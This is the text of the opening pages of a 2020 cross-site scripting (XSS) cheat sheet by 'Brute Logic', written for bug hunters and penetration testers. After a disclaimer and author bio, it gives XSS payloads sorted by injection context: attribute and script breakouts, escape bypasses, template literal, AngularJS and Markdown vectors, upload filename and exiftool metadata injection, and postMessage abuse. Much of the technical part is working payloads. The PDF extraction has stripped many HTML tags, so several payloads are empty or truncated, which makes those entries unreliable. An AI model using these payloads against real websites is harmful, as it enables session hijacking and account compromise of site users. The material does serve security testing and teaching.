XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 1
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
"We only need to be lucky once.
They need to be lucky every time ."
Adapted from Irish Republican Army (IRA) statement - 1984.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 2
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Disclaimer
We, author and publisher, are not responsible for the use of this material or the damage
caused by application of the information provided in this book.
Introduction
This cheat sheet is meant to be used by bug hunters, penetration testers, security analysts,
web application security students and enthusiasts.
It’s about Cross-Site Scripting (XSS), the most widespread and common flaw found in the
World Wide Web. You must be familiar with (at least) basic concepts of this flaw to enjoy
this book. For that you can visit my blog at https://brutelogic.com.br/blog/xss101 to start.
There’s lot of work done in this field and it’s not the purpose of this book to cover them all.
What you will see here is XSS content created or curated by me. I’ve tried to select what I
think it’s the most useful info about that universe, most of the time using material from my
own blog which is dedicated to that very security flaw.
IMPORTANT: if you got a pirate version of this material, please consider make a donation to
the author at https://paypal.me/brutelogic.
The structure of this book is very simple because it’s a cheat sheet. It has main subjects
(Basics, Advanced, etc) and a taxonomy for every situation. Then come directions to use the
code right after, which comes one per line when in the form of a vector or payload. Some
are full scripts, also with their use properly explained.
Keep in mind that you might need to adapt some of the info presented here to your own
scenario (like single to double quotes and vice-versa). Although I try to give you directions
about it, any non-imagined specific behavior from you target application might influence
the outcome.
A last tip: follow instructions strictly. If something is presented in an HTML fashion, it’s
because it’s meant to be used that way. If not, it’s probably javascript code that can be used
(respecting syntax) both in HTML and straight to existing js code. Unless told otherwise.
I sincerely hope it becomes an easy-to-follow consulting material for most of your XSS
related needs. Enjoy!
Rodolfo Assis (Brute)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 3
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
About This Release
This release include code that works on latest stable versions of major Gecko-based
browsers (Mozilla Firefox branches) and Chromium-based browsers (Google Chrome,
Opera, Apple Safari and Microsoft Edge).
Current desktop versions of those browsers are: Mozilla Firefox v73, Google Chrome v80,
Opera v66 and Apple Safari v13. If you find something that doesn’t work as expected or any
correction you think it should be made, please let me know @brutelogic (Twitter) or drop an
email for brutelogic at null dot net.
Internet Explorer although still regarded as a major browser is barely covered in this release.
Some information was removed from previous edition as well as new and updated
information was added to this edition.
About The Author
Rodolfo Assis aka “Brute Logic” (or just “Brute”) is a self-taught computer hacker from Brazil
working as a self-employed information security researcher and consultant.
He is best known for providing some content in Twitter (@brutelogic) in the last years on
several hacking topics, including hacking mindset, techniques, micro code (that fits in a
tweet) and some funny hacking related stuff. Nowadays his main interest and research
involves Cross Site Scripting (XSS), the most widespread security flaw of the web.
Brute helped to fix more than 1000 XSS vulnerabilities in web applications worldwide via
Open Bug Bounty platform (former XSSposed). Some of them include big players in tech
industry like Oracle, LinkedIn, Baidu, Amazon, Groupon e Microsoft.
Being hired to work with the respective team, he was one of the contributors improving
Sucuri’s Website Application Firewall (CloudProxy) from 2015 to 2017, having gained a lot
of field experience in web vulnerabilities and security evasion.
He is currently managing, maintaining and developing an online XSS Proof-of-Concept tool,
named KNOXSS (https://knoxss.me). It already helped several bug hunters to find bugs and
get rewarded as well as his blog (https://brutelogic.com.br).
Always supportive, Brute is proudly a living example of the following philosophy:
Don’t learn to hack, #hack2learn.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 4
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Illustration
Layout & Design:
Rodolfo Assis
@rodoassis (Twitter)
Cover photo by Andrew Neel on Unsplash.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 5
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Summary
1. Basics ……………………………………………………………………………………………………………..………. 7
2. Advanced ………………………………………………………………………………………………………………... 8
3. Bypass ……………………………………………………………………………………………………..…………..…. 12
4. Exploiting ……………………………………………………………………………………..…………………………. 21
5. Extra ……………………………………………………………………………..……………………….……………….. 24
6. Brutal ……………………………………………………………………………………………………………………… 28
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 6
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
HTML Injection
Use when input lands inside an attribute’s value of an HTML tag or outside tag except the
ones described in next case. Prepend a “-->” to payload if input lands in HTML comments.
">
HTML Injection – Tag Block Breakout
Use when input lands inside or between opening/closing of the following tags:
 and  ( is
accordingly).
">
HTML Injection - Inline
Use when input lands inside an attribute’s value of an HTML tag but that tag can’t be
terminated by greater than sign (>).
"onmouseover=alert(1) //
"autofocus onfocus=alert(1) //
HTML Injection - Source
Use when input lands as a value of the following HTML tag attributes: href, src, data or
action (also formaction). Src attribute in script tags can be an URL or “data:,alert(1)”.
javascript:alert(1)
Javascript Injection
Use when input lands in a script block, inside a string delimited value.
'-alert(1)-'
'/alert(1)//
Javascript Injection - Escape Bypass
Use when input lands in a script block, inside a string delimited value but quotes are
escaped by a backslash.
\'/alert(1)//
Javascript Injection – Script Breakout
Use when input lands anywhere within a script block.
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 7
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Javascript Injection - Logical Block
Use 1st or 2nd payloads when input lands in a script block, inside a string delimited value and
inside a single logical block like function or conditional (if, else, etc). If quote is escaped with
a backslash, use 3rd payload.
'}alert(1);{'
'}alert(1)%0A{'
\'}alert(1);{//
Javascript Injection - Quoteless
Use when there’s multi reflection in the same line of JS code. 1st payload works in simple JS
variables and 2nd one works in non-nested JS objects.
/alert(1)//\
/alert(1)}//\
Javascript Context - Placeholder Injection in Template Literal
Use when input lands inside backticks (``) delimited strings or in template engines.
${alert(1)}
Multi Reflection HTML Injection - Double Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
'onload=alert(1)>alert(1)/*
Multi Reflection i HTML Injection - Triple Reflection (Single Input)
Use to take advantage of multiple reflections on same page.
*/alert(1)">'onload="/*'onload="`'>alert(1)/*
p=
q=
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 8
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
File Upload Injection – Filename
Use when uploaded filename is reflected somewhere in target page.
">.gif
File Upload Injection – Metadata
Use when metadata of uploaded file is reflected somewhere in target page. It uses
command-line exiftool (“$” is the terminal prompt) and any metadata field can be set.
$ exiftool -Artist='">' xss.jpeg
File Upload Injection – SVG File
Use to create a stored XSS on target when uploading image files. Save content below as
“xss.svg”.
DOM Insert Injection
Use to test for XSS when injection gets inserted into DOM as valid markup instead of being
reflected in source code. It works for cases where script tag and other vectors won’t work.
DOM Insert Injection – Resource Request
Use when native javascript code inserts into page the results of a request to an URL that
can be controlled by attacker.
data:text/html,
data:text/html,
PHP Self URL Injection
Use when current URL is used by target’s underlying PHP code as an attribute value of an
HTML form, for example. Inject between php extension and start of query part (?) using a
leading slash (/).
https://brutelogic.com.br/xss.php/">?a=reader
Markdown Vector
Use in text boxes, comment sections, etc that allows some markup input. Click to fire.
[clickme](javascript:alert`1`)
________________________________________________________________________________________________________________________
© 2020 Brute Logic – All rights reserved. 9
XSS Cheat Sheet – 2020 Edition
________________________________________________________________________________
Script Injection - No Closing Tag
Use when there’s a closing script tag () somewhere in the code after reflection.
Javascript postMessage() DOM Injection (with Iframe)
Use when there’s a “message” event listener like in “window.addEventListener(‘message’, ...)”
in javascript code without a check for origin. Target must be able to be framed (X-Frame
Options header according to context). Save as HTML file (or using data:text/html) providing
TARGET_URL and INJECTION (a XSS vector or payload).
XML-Based XSS
Use to inject XSS vector in a XML page (content types text/xml or application/xml).
Prepend a “-->” to payload if input lands in a comment section or “]]>” if input lands in a
CDATA section.
alert(1)
AngularJS Injections (v1.6 and up)
Use when there’s an AngularJS library loaded in page, inside an HTML block with ng-app
directive (1st payload) or creating your own (2nd one).
{{$new.constructor('alert(1)')()}}
{{$new.constructor('alert(1)')()}}
Onscroll Universal Vector
Use to XSS without user interaction when using onscroll event handler. It works with
address, blockquote, body, center, dir, div, dl, dt, form, li, menu, ol, p, pre, ul, and h1 to h6
HTML tags.
AAA#y
Type Juggling
Use to pass an “if” condition matching a number in loose comparisons.
1
1">
________________________________________________________________________________________________________________________